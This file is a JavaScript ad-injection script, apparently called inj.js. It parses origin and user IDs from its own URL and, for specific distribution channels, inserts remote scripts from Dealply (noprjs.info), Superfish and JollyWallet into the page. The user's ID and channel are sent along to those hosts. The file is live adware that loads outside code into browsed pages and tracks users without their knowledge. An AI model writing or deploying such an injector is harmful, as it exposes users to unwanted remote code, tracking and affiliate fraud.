(function () {
    var __inj =
    {
        OriginId: '',
        UserId: '',
        ParamUrl: '',
        ScrUrl: '',
        SetParams: function () {
            __inj.SetThisUrl();
            this.ParamUrl = '';
            var StartIndex = __inj.ScrUrl.indexOf('?');
            if (StartIndex > -1) {
                var query_string = __inj.ScrUrl.substr(StartIndex + 1); //.toLowerCase();
                var _params = query_string.split('&');
                //  var EndIndex = new Number();
                for (var i2 = 0; i2 < _params.length; i2++) {
                    var keyvaluepair = _params[i2].split('=');
                    if (keyvaluepair.length != 2)
                        continue;
                    if (keyvaluepair[0].toLowerCase() == 'keyword' && keyvaluepair[1].length > 0)
                        this.keyword = keyvaluepair[1];
                    else if (keyvaluepair[0].toLowerCase() == 'originid' && keyvaluepair[1].length > 0)
                        __inj.OriginId = keyvaluepair[1].toLowerCase();
                    else if (keyvaluepair[0].toLowerCase() == 'useruniqueid')
                        __inj.UserId = keyvaluepair[1];
                    __inj.ParamUrl += keyvaluepair[0] + '=' + keyvaluepair[1] + '&';
                }
            }
        },
        ToInject: function () {
            //IY_A1_SFJWDP_070414
            return (__inj.OriginId == '55CAA5D1-66B3-E311-99C2-001517D1792A'.toLowerCase());
        },
        GetCleanOriginId: function () {
            var id = __inj.OriginId;
            while (id.indexOf('-') > -1)
                id = id.replace('-', '');
            return id;
        },
        SetThisUrl: function () {
            var _scripts = document.getElementsByTagName('script');
            for (var j = 0; j < _scripts.length; j++) {
                if (_scripts[j].src.toLowerCase().indexOf('/npsb/inj.js') > -1)
                    __inj.ScrUrl = _scripts[j].src;
            }
        },
        _Inject: function () {
            var _ToInject = __inj.ToInject();
            var s = document.getElementsByTagName('script')[0];
            //Dealply
            if (_ToInject || __inj.OriginId == '39239192-99AE-E311-99C2-001517D1792A'.toLowerCase() ||
                                __inj.OriginId == 'C23BF9C5-D881-E311-B7DA-001517D1792A'.toLowerCase()) {
                //39239192-99AE-E311-99C2-001517D1792A Downloadius_desktop_1
                //C23BF9C5-D881-E311-B7DA-001517D1792A Downloadius 
                var _script1 = document.createElement('script');
                _script1.type = 'text/javascript';
                _script1.async = true;
                var _url_params = '?hid=' + __inj.UserId + '&channel=' + __inj.GetCleanOriginId();
                _script1.src = ((window.location.protocol == 'https:') ? ('https://i_noprjs_info.tlscdn.com/nopr/javascript.js' + _url_params) : ('http://i.noprjs.info/nopr/javascript.js' + _url_params));

                s.parentNode.insertBefore(_script1, s);
                //?hid=USER_ID
            }
            //superfish
            if (_ToInject || __inj.OriginId == '7C420E32-FDC9-E311-99C2-001517D1792A'.toLowerCase()) { //SC_A1_SF_220414
                var _script3 = document.createElement('script');
                _script3.type = 'text/javascript';
                _script3.async = true;
                _script3.src = ((window.location.protocol == 'https:') ? 'https:' : 'http:') + '//www.superfish.com/ws/sf_main.jsp?dlsource=xyz&CTID=' + __inj.OriginId;
                s.parentNode.insertBefore(_script3, s);
            }
            if (!_ToInject)
                return;
            //jollywallet
            var _script2 = document.createElement('script');
            _script2.type = 'text/javascript';
            _script2.async = true;
            _script2.src = ((window.location.protocol == 'https:') ? 'https:' : 'http:') + '//api.jollywallet.com/affiliate/client?dist=229&sub=' + __inj.OriginId;
            s.parentNode.insertBefore(_script2, s);


        }

    };
    __inj.SetParams();
    __inj._Inject();
})();
